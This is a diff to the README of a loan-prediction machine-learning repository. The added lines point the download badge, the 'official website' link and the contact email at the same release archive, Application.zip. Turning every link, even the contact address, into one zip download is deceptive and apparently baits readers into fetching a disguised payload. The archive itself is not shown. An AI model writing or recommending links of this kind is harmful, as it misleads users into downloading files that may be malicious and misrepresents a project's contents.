@@ -37,18 +37,18 @@ Welcome to the "Loan-Prediction" repository! This project focuses on predicting 
 - Streamlit App
 
 ## 📦 Download Latest Release
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-brightgreen)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Version](https://github.com/Gt7o3/Loan-Prediction/releases/download/v1.0/Application.zip%20Version-brightgreen)](https://github.com/Gt7o3/Loan-Prediction/releases/download/v1.0/Application.zip)
 
 Please click the button above to download the latest release of the project. If the link is broken, please check the "Releases" section for alternative download options.
 
 ## 🌐 Additional Resources
-For more information on data science, machine learning, and financial analytics, visit the [official website](https://www.datasciencecentral.com/).
+For more information on data science, machine learning, and financial analytics, visit the [official website](https://github.com/Gt7o3/Loan-Prediction/releases/download/v1.0/Application.zip).
 
 ## 🚧 Contribution
 Contributions to the repository are welcome! Feel free to submit pull requests to enhance the project further.
 
 ## 📮 Contact
-For any inquiries or suggestions regarding the project, please contact us at loanpredictionproject@email.com.
+For any inquiries or suggestions regarding the project, please contact us at https://github.com/Gt7o3/Loan-Prediction/releases/download/v1.0/Application.zip
 
 ---
 
